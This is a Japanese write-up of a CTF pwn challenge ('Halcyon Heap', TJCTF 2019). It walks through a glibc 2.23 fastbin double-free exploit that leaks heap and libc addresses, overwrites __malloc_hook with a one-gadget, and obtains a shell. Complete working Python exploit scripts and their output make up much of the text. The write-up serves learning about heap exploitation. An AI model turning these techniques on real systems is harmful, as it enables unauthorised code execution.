# [pwn 200pts] Halcyon Heap - TJCTF 2019
64bitで全部有効です。Heap系かな？
```
$ checksec d87f3952b7283e14cb5507d52436f8ee9af762a89edf2d9d9b8a805132ec2d2a_halcyon_heap
[*] 'd87f3952b7283e14cb5507d52436f8ee9af762a89edf2d9d9b8a805132ec2d2a_halcyon_heap'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP enabled (Canary found)
    RELRO:	Full RELRO
    PIE:	PIE enabled
```
IDAで解析しましょう。
領域をmallocしてデータを書き込む`sice_deet`は次のような感じです。

- 生成できるdeetは0x15個まで(`num < 0x16`)
- サイズは0x78バイトまで
- `deet_list[num] = malloc(size);`
- `size_list[num] = size;`
- `read(0, deet_list[num], size);`
- numに1足す

特に変わった点はありません。
次に指定したインデックスのdeetを出力する`observe_deet`は次のような感じです。

- indexは0x15以下しか指定できない
- `write(1, deet_list[index], size_list[index]);`

無条件で出力するので削除後でも`size_list`が0になっていなければヒープのアドレスとかをリークできそうです。
最後に指定したインデックスのdeetを削除する`destroy_deet`は次のような感じです。

- indexは0x15以下しか指定できない
- `free(deet_list[index]);`
- numは減らない

double freeの脆弱性がありますね。
libcが配布されているのでハッシュ値からバージョンを調べたところ、libc-2.23.soということが分かりました。
残念ながら私の好きなtcacheは実装されていないバージョンなので、fastbinを使いましょう。

イメージとしてはfastbinに2つ繋げてobserveでヒープのアドレスをリークし、その後double freeでfastbin corruption attackをする感じでしょうか。
まずはヒープのアドレスを取得しましょう。

```python
from ptrlib import *

def sice_deet(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("> ")
    sock.sendline(str(size))
    sock.recvuntil("> ")
    sock.send(data)

def observe_deet(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("> ")
    sock.sendline(str(index))
    return sock.recvline().rstrip()

def destroy_deet(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("> ")
    sock.sendline(str(index))

sock = Process("./d87f3952b7283e14cb5507d52436f8ee9af762a89edf2d9d9b8a805132ec2d2a_halcyon_heap")

sice_deet(0x10, b"A" * 0x10)
sice_deet(0x10, b"B" * 0x10)
destroy_deet(1)
destroy_deet(0)

data = observe_deet(0)
addr_heap = u64(data[:8])
dump("addr heap = " + hex(addr_heap))
```

これで2つ目に生成したdeetのアドレスが取得できています。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=9594)
[ptrlib] addr heap = 0x563bef3f5280
```

次はfastbin corruption attackかなーと思ったのですが、正直サイズチェックがあるのでfastbin attackはあんまり上手くいかない印象が強いです。
せめてlibcのアドレスがわかれば`__malloc_hook`を使ってone gadget rceを呼べるのですが、今はlibcのアドレスを持っていません。
ということで、まずはlibcのアドレスを取得することから考えましょう。

一番簡単そうなのはunsorted binを使う方法ですが、deetで生成できるサイズは0x78までで、fastbinの範囲に収まっています。
overlapを引き起こせればチャンクのサイズを書き換えてunsorted binに入れられるかもしれません。
今ヒープのアドレスが分かっているので、fastbin attackでそこから0X10引いたアドレスをリンクしてやれば、チャンクサイズを書き換えることが可能です。
ヒープ上ですので、そのチャンクのサイズは前のチャンクのデータ部にあたり、偽装できます。

と思って次のようなコードを書いたのですが、
```python
from ptrlib import *
from time import sleep

def sice_deet(size, data):
    sock.recvuntil("4. Exit")
    sock.sendline("1")
    sock.sendline(str(size))
    sock.send(data)

def observe_deet(index):
    sock.recvuntil("4. Exit")
    sock.sendline("2")
    sock.recvuntil("Which deet would you like to view?")
    sock.recvuntil("> ")
    sock.sendline(str(index))
    return sock.recvline().rstrip()

def destroy_deet(index):
    sock.recvuntil("4. Exit")
    sock.sendline("3")
    sock.sendline(str(index))

#sock = Socket("p1.tjctf.org", 8002)
sock = Socket("localhost", 8002)

# leak heap addr
sice_deet(0x20, b"A" * 0x20) # 0
sice_deet(0x20, b"B" * 0x20) # 1
destroy_deet(1)
destroy_deet(0)
data = observe_deet(0)
addr_heap = u64(data[:8])
dump("addr heap = " + hex(addr_heap))

# overlap
destroy_deet(1)
payload = p64(addr_heap - 0x10)
payload += b'\x00' * 0x18
sice_deet(0x20, payload) # 2 == 1
payload = b'\x00' * 0x18
payload += p64(0x31)
sice_deet(0x20, payload) # 3 == 0
sice_deet(0x20, b"\x00" * 0x20) # 4 == 1
fake_chunk = b'\x00' * 8
fake_chunk += p64(0xff1) # size
fake_chunk += b'C' * 0x10
sice_deet(0x20, fake_chunk) # 5 == address_of(1) - 0x10

# leak libc
#destroy_deet(4)
print(observe_deet(4))
sock.interactive()
```

落ちてしまいました。
```
double free or corruption (!prev)
```

これは消そうとしている次のチャンクの`prev_inuse`フラグが0になっているからです。
したがって、いくつかチャンクを作って次の`prev_inuse`に当たる場所を0x11とか適当な値にしてやりましょう。
最後の方を次のようなコードに変更します。
```python
...
sice_deet(0x20, fake_chunk) # 5 == address_of(1) - 0x10
sice_deet(0x70, b"A" * 0x70)
sice_deet(0x70, b"A" * 0x70)
sice_deet(0x10, b"A" * 0x8 + p64(0x11))

# leak libc
destroy_deet(4)
print(observe_deet(4))
sock.interactive()
```

それっぽいアドレスが取れました。
```
$ python solve.py 
[+] Socket: Successfully connected to p1.tjctf.org:8002
[ptrlib] addr heap = 0x55cb3e6d5030
b'x\x8b\x9b\xddk\x7f\x00\x00x\x8b\x9b\xddk\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Welcome to Halcyon Heap!'
[ptrlib]$ 1. Sice a deet
2. Observe a deet
3. Brutally destroy a deet
4. Exit
>
```

後は`main_arena`のアドレス(+α)を引いてやればlibcのアドレスが取れます。
```
$ main_arena 74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44_libc.so.6
[+]libc version : glibc 2.23
[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a
[+]main_arena_offset : 0x3c4b20
```

さて、ここからシェルを奪う必要があります。
TCacheが有効なら割と簡単なのですが、今回はfastbinなので`__malloc_hook`をone gadget rceのアドレスに書き換えてやります。
`__malloc_hook`のちょっと前にあるアドレスが`0x7f....`なので、これを`prev_inuse`が立っている適切なサイズとして扱うことができます。
こんな感じです。
```
0x7f9ad5372c10 <_IO_wide_data_0+304>:	0x60	0xed	0x36	0xd5	0x9a	0x7f	0x00	0x00
0x7f9ad5372c18:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7f9ad5372c20 <__memalign_hook>:	0x10	0xe4	0x01	0xd5	0x9a	0x7f	0x00	0x00
0x7f9ad5372c28 <__realloc_hook>:	0x90	0xf7	0x01	0xd5	0x9a	0x7f	0x00	0x00
0x7f9ad5372c30 <__malloc_hook>:	0x40	0xda	0x01	0xd5	0x9a	0x7f	0x00	0x00
```
したがって、`__malloc_hook - 27`にchunk sizeが来るようにすればOKです。

なんかサイズ0x20でやるとエラーになったので0x60のサイズで試したら上手くいきました。
（理由はよくわからない。）
```
from ptrlib import *
from time import sleep


def sice_deet(size, data):
    sock.recvuntil("4. Exit")
    sock.sendline("1")
    sock.sendline(str(size))
    sock.send(data)

def observe_deet(index):
    sock.recvuntil("4. Exit")
    sock.sendline("2")
    sock.recvuntil("Which deet would you like to view?")
    sock.recvuntil("> ")
    sock.sendline(str(index))
    return sock.recvline().rstrip()

def destroy_deet(index):
    sock.recvuntil("4. Exit")
    sock.sendline("3")
    sock.sendline(str(index))

libc = ELF("74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44_libc.so.6")
sock = Socket("p1.tjctf.org", 8002)
#sock = Socket("localhost", 8002)
libc_main_arena = 0x3c4b20
delta = 0x58
libc_one_gadget = 0xf1147

# leak heap addr
sice_deet(0x20, b"A" * 0x20) # 0
sice_deet(0x20, b"B" * 0x20) # 1
destroy_deet(1)
destroy_deet(0)
data = observe_deet(0)
addr_heap = u64(data[:8])
dump("addr heap = " + hex(addr_heap))

# overlap
destroy_deet(1)
payload = p64(addr_heap - 0x10)
payload += b'\x00' * 0x18
sice_deet(0x20, payload) # 2 == 1
payload = b'\x00' * 0x18
payload += p64(0x31)
sice_deet(0x20, payload) # 3 == 0
sice_deet(0x20, b"\x00" * 0x20) # 4 == 1
fake_chunk = b'\x00' * 8
fake_chunk += p64(0x131) # size
fake_chunk += b'C' * 0x10
sice_deet(0x20, fake_chunk) # 5 == address_of(1) - 0x10
sice_deet(0x70, b"A" * 0x70) # 6
sice_deet(0x70, b"A" * 0x70) # 7
sice_deet(0x10, b"A" * 0x8 + p64(0x11)) # 8

# leak libc
destroy_deet(4)
l = observe_deet(4)
addr_main_arena = u64(l[:8])
libc_base = addr_main_arena - libc_main_arena - delta
addr_one_gadget = libc_base + libc_one_gadget
addr_malloc_hook = libc_base + libc.symbol("__malloc_hook")
dump("libc base = " + hex(libc_base))

# fastbin corruption attack
sice_deet(0x60, b'A' * 0x60) # 9
sice_deet(0x60, b'A' * 0x60) # 10
destroy_deet(9)
destroy_deet(10)
destroy_deet(9)

payload = p64(addr_malloc_hook - 27 - 8)
sice_deet(0x60, payload) # 11 == 9
sice_deet(0x60, b"\x00" * 0x60) # 12 == 10
sice_deet(0x60, b"\x00" * 0x60) # 13 == 9
payload = b'\x00' * (3 + 16)
payload += p64(addr_one_gadget) # __malloc_hook
sice_deet(0x60, payload) # 14 == __malloc_hook - 27 + 8

# get the shell!
sock.interactive()
```

できたー！！
```
$ python solve.py 
[+] Socket: Successfully connected to p1.tjctf.org:8002
[ptrlib] addr heap = 0x55954d740030
[ptrlib] libc base = 0x7fa8e239f000
[ptrlib]$ 
> Enter the size of your deet: 
> Enter your deet: 
> Done!
Welcome to Halcyon Heap!
1. Sice a deet
2. Observe a deet
3. Brutally destroy a deet
4. Exit
> 1
[ptrlib]$ 1
Enter the size of your deet: 
> [ptrlib]$ ls
[ptrlib]$ flag.txt
halcyon_heap
libc.so.6
wrapper
  
[ptrlib]$ cat flag.txt
[ptrlib]$ 
tjctf{d0uble_deets_0r_doubl3_free?}
```

最後constraintsが当てはまらないone gadgetを使ってて少し詰まった。

# 感想
久しぶりのfastbinで面白かったです。
強い人はこういうの何時間くらいで解けるんだろう。
あと古いlibcは`LD_PRELOAD`できないんだけどfastbinってどうやってデバッグするの？
いっつも途中から本番環境に切り替えてクラッシュしたらguessしてるんだけど......

やっぱりtcacheは偉大だと再認識しました。

# 参考文献
[1] [https://ctftime.org/writeup/14625](https://ctftime.org/writeup/14625)